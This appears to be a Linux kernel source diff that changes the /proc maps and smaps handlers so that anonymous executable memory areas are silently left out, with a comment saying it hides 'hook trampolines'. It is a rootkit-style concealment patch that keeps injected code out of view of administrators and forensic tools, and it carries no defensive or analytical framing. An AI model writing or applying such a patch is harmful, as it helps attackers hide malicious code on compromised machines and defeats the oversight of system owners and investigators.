@@ -502,10 +502,19 @@ done:
 
 static int show_map(struct seq_file *m, void *v)
 {
-	show_map_vma(m, v);
-	m_cache_vma(m, v);
-	return 0;
+    struct vm_area_struct *vma = v;
+
+    /* hide anon exec vmalloc VMAs (hook trampolines) */
+    if (!vma->vm_file &&
+	(vma->vm_flags & VM_EXEC) &&
+	!(vma->vm_ops && vma->vm_ops->name))
+        return 0;
+
+    show_map_vma(m, v);
+    m_cache_vma(m, v);
+    return 0;
 }
+
 
 static const struct seq_operations proc_pid_maps_op = {
 	.start	= m_start,
@@ -996,6 +1005,12 @@ static int show_smap(struct seq_file *m, void *v)
 {
 	struct vm_area_struct *vma = v;
 	struct mem_size_stats mss;
+
+    /* hide anon exec vmalloc VMAs (hook trampolines) */
+    if (!vma->vm_file &&
+	(vma->vm_flags & VM_EXEC) &&
+	!(vma->vm_ops && vma->vm_ops->name))
+        return 0;
 
 	memset(&mss, 0, sizeof(mss));
 
